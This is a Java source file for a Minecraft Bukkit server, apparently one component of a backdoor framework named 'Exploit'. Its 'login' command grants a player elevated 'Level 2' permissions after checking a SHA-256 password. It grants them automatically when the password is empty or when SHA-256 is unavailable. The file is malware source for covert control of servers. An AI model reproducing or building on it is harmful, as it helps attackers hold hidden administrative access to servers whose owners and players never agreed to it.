package com.tmquan2508.exploit.commands;

import com.tmquan2508.exploit.Exploit;
import org.bukkit.entity.Player;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class LoginCommand extends Command {

    public LoginCommand() { super(); }

    @Override public String getName() { return "login"; }
    @Override public String getDescription() { return "Log in for elevated permissions (Level 2)."; }
    @Override public String getUsage() { return "<password>"; }
    @Override public int getRequirePerm() { return 1; }

    @Override
    public void execute(Player sender, String[] args) {
        boolean isPasswordNotSet = Exploit.config.authorized_password.isEmpty() ||
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855".equals(Exploit.config.authorized_password);
        if (isPasswordNotSet) { Exploit.permissionLevels.put(sender.getUniqueId(), 2); Exploit.sender.sendMessage(sender, "Login successful because password is not set. You now have Level 2 permissions."); return; }
        if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(args[0].getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder(2 * hash.length);
            for (byte b : hash) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }

            if (hexString.toString().equals(Exploit.config.authorized_password)) {
                Exploit.permissionLevels.put(sender.getUniqueId(), 2);
                Exploit.sender.sendMessage(sender, "Login successful. You now have Level 2 permissions.");
            } else {
                Exploit.sender.sendError(sender, "Incorrect password.");
            }
        } catch (NoSuchAlgorithmException e) {
            Exploit.sender.sendError(sender, "This server runs in a Java environment that doesn't have the SHA-256 algorithm!");
            Exploit.sender.sendWarn(sender, "Therefore, anyone on the authorized list can get permission.");
            Exploit.permissionLevels.put(sender.getUniqueId(), 2);
            Exploit.sender.sendMessage(sender, "Login successful. You now have Level 2 permissions.");
        }
    }
}